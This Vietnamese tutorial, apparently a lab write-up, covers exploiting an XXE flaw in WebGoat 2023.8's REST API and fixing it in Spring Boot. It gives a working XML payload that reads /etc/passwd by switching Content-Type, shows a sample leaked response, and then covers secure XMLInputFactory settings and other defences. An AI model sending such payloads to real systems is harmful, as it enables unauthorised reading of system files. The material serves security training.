---
title: 1.07 | XXE
slug: XXE-07
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> 🚀 **XXE Attack trong Modern REST API**

#### 🎯 **Mục tiêu**
- Khai thác lỗ hổng XXE trên REST API hiện đại.
- Thực hiện XML Injection bằng cách thay đổi `Content-Type`.
- Phát hiện và bảo vệ API khỏi XXE.


## 🔍 **1. Phân tích bài toán**
- API đang xử lý JSON (`Content-Type: application/json`).
- Nếu API cũng hỗ trợ XML mà không kiểm soát đúng cách, có thể bị **XXE Attack**.
- **Mục tiêu:** Chuyển đổi request từ JSON sang XML và thực hiện XXE Injection.


## 🛠 **2. Thử nghiệm tấn công XXE**
### **🔎 2.1. Kiểm tra request gốc (JSON)**
Request hợp lệ khi gửi bình luận:
```http
POST /WebGoat/xxe/simple
Content-Type: application/json

{
  "text": "This is a safe comment"
}
```
👉 **Dữ liệu được xử lý bình thường**.


### **🚨 2.2. Tấn công XXE (Chuyển JSON -> XML)**
Sử dụng **Burp Suite**, **ZAP** hoặc **DevTools** để thay đổi request:

#### **🛑 Chỉnh sửa Header & Body**
```http
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE comment [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <text>&xxe;</text>
</comment>
```
🕵 **Mục đích**:
- **Thay đổi `Content-Type` từ JSON sang XML**.
- **Thêm một thực thể `xxe` trỏ đến file hệ thống**.
- **Nếu API dễ bị tấn công, nó sẽ trả về nội dung file `/etc/passwd`** (Linux).

Trong trường hợp sử dụng Windows, bạn có thể thay đổi đường dẫn file `C:\Windows\System32\drivers\etc\hosts` thay cho `/etc/passwd` để kiểm tra.

#### **📌 Nếu API dễ bị tấn công, phản hồi có thể là:**
```json
{
  "lessonCompleted": false,
  "feedback": "Your comment: root:x:0:0:...",
  "output": "User details leaked!"
}
```
👉 **Lỗ hổng XXE đã khai thác thành công!**


## 🔎 **3. Vì sao API bị tấn công?**
### **⚠️ Sai sót trong xử lý XML**
#### **❌ Cấu hình không an toàn trong Spring Boot**
```java
public XmlMapper xmlMapper() {
  return new XmlMapper(XMLInputFactory.newInstance());
}
```
🚨 **Lỗi:**
- Sử dụng **`XMLInputFactory.newInstance()` trực tiếp** mà không chặn các thực thể XML.
- Không tắt **`SUPPORT_DTD`** và **`IS_SUPPORTING_EXTERNAL_ENTITIES`** → **Dễ bị XXE!**


## ✅ **4. Cách phòng chống XXE**
### **🛡 4.1. Cấu hình XML Parser an toàn**
```java
private static XMLInputFactory secureXmlInputFactory() {
  XMLInputFactory factory = XMLInputFactory.newInstance();
  factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
  factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
  return factory;
}

public XmlMapper xmlMapper() {
  return new XmlMapper(secureXmlInputFactory());
}
```
📌 **Cách fix:**
- **Tạo `XMLInputFactory` riêng** và **tắt các thực thể XML**.
- **Không sử dụng `XMLInputFactory.newInstance()` trực tiếp**.


### **🛡 4.2. Các biện pháp bảo vệ khác**
| 🔍 **Biện pháp** | ✅ **Mô tả** |
|----------------|-------------|
| **Tắt DTD và External Entities** | `SUPPORT_DTD = false`, `IS_SUPPORTING_EXTERNAL_ENTITIES = false` |
| **Giới hạn định dạng input** | Chỉ chấp nhận JSON nếu không cần XML |
| **Dùng thư viện an toàn** | Dùng `Jackson`, `DOM/SAX Parser` với cấu hình bảo mật |
| **Giới hạn kích thước XML input** | Tránh tấn công DoS với XML Bomb |
| **Dùng JSON thay vì XML** | Hạn chế hỗ trợ XML nếu không cần thiết |


## 🔥 **5. Kết luận**
- **API REST hiện đại có thể bị tấn công XXE nếu hỗ trợ XML không đúng cách**.
- **Tấn công bằng cách thay đổi `Content-Type` và chèn thực thể XML**.
- **Luôn kiểm tra cẩn thận và cấu hình XML parser an toàn**.
- **Ưu tiên JSON nếu không cần thiết hỗ trợ XML**.

📌 **Tham khảo:** [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) 🚀